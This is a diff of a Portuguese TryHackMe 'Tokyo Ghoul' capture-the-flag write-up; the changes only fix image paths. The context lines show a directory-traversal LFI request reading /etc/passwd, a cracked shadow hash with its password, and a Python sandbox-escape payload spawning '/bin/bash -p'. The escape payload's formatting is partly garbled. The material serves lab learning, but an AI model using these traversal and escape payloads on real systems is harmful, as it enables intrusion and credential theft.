@@ -112,28 +112,28 @@ ftp> exit
 
 - Ao analisar o binário, verifica-se uma palavra que não aparece no texto de execução
 
-![Untitled](TryHackMe%20-%20Tokyo%20Ghoul%20f3445adefbf44ffda5af426f0caa1101/Untitled.png)
+![Untitled](TryHackMe-TokyoGhoulf3445adefbf44ffda5af426f0caa1101/Untitled.png)
 
 - Extraindo informação
 
-![Untitled](TryHackMe%20-%20Tokyo%20Ghoul%20f3445adefbf44ffda5af426f0caa1101/Untitled%201.png)
+![Untitled](TryHackMe-TokyoGhoulf3445adefbf44ffda5af426f0caa1101/Untitled1.png)
 
 - Ao textar extrair informação da imagem com a senha encontrada, encontra-se um texto em morse
 - Comando:  `steghide extract -sf rize_and_kaneki.jpg`
 
-![Untitled](TryHackMe%20-%20Tokyo%20Ghoul%20f3445adefbf44ffda5af426f0caa1101/Untitled%202.png)
+![Untitled](TryHackMe-TokyoGhoulf3445adefbf44ffda5af426f0caa1101/Untitled2.png)
 
 `5A4446794D324D334D484A3558324E6C626E526C63673D3D`
 
-![Untitled](TryHackMe%20-%20Tokyo%20Ghoul%20f3445adefbf44ffda5af426f0caa1101/Untitled%203.png)
+![Untitled](TryHackMe-TokyoGhoulf3445adefbf44ffda5af426f0caa1101/Untitled3.png)
 
 - O Hashcat identificou erroneamente, pois não é um hash. O código está em HEX que após decodificar, verifica-se um base64
 
-![Untitled](TryHackMe%20-%20Tokyo%20Ghoul%20f3445adefbf44ffda5af426f0caa1101/Untitled%204.png)
+![Untitled](TryHackMe-TokyoGhoulf3445adefbf44ffda5af426f0caa1101/Untitled4.png)
 
 `d1r3c70ry_center`
 
-![Untitled](TryHackMe%20-%20Tokyo%20Ghoul%20f3445adefbf44ffda5af426f0caa1101/Untitled%205.png)
+![Untitled](TryHackMe-TokyoGhoulf3445adefbf44ffda5af426f0caa1101/Untitled5.png)
 
 - Comando: `dirsearch -r -u [http://10.10.208.57/d1r3c70ry_center/](http://10.10.208.57/d1r3c70ry_center/) -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -e txt,php -f`
 
@@ -154,11 +154,11 @@ Target: http://10.10.208.57/d1r3c70ry_center/
 [13:16:11] 301 -  329B  - /d1r3c70ry_center/claim  ->  http://10.10.208.57/d1r3c70ry_center/claim/
 ```
 
-![Untitled](TryHackMe%20-%20Tokyo%20Ghoul%20f3445adefbf44ffda5af426f0caa1101/Untitled%206.png)
+![Untitled](TryHackMe-TokyoGhoulf3445adefbf44ffda5af426f0caa1101/Untitled6.png)
 
 - Ao tentar explorar o possível LFI, joguei no intruder do Burp e com os payloads padrões, encontrei um bypass
 
-![Untitled](TryHackMe%20-%20Tokyo%20Ghoul%20f3445adefbf44ffda5af426f0caa1101/Untitled%207.png)
+![Untitled](TryHackMe-TokyoGhoulf3445adefbf44ffda5af426f0caa1101/Untitled7.png)
 
 ```html
 GET /d1r3c70ry_center/claim/index.php?view=%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2Fetc%2Fpasswd HTTP/1.1
@@ -237,7 +237,7 @@ kamishiro:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET
 
 - Credenciais encontradas: `kamishiro`:`$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0`:`password123`
 
-![Untitled](TryHackMe%20-%20Tokyo%20Ghoul%20f3445adefbf44ffda5af426f0caa1101/Untitled%208.png)
+![Untitled](TryHackMe-TokyoGhoulf3445adefbf44ffda5af426f0caa1101/Untitled8.png)
 
 ## Exploração (Acesso Inicial)
 
@@ -299,4 +299,4 @@ if __name__ == "__main__":
         ```python
         **__builtins__**.__**dict__**['__**IMPORT__**'.lower()](https://www.notion.so/'OS'.lower()).__**dict__**['SYSTEM'.lower()]('/bin/bash -p')
         ```
-![Untitled](TryHackMe%20-%20Tokyo%20Ghoul%20f3445adefbf44ffda5af426f0caa1101/Untitled%209.png)
+![Untitled](TryHackMe-TokyoGhoulf3445adefbf44ffda5af426f0caa1101/Untitled9.png)
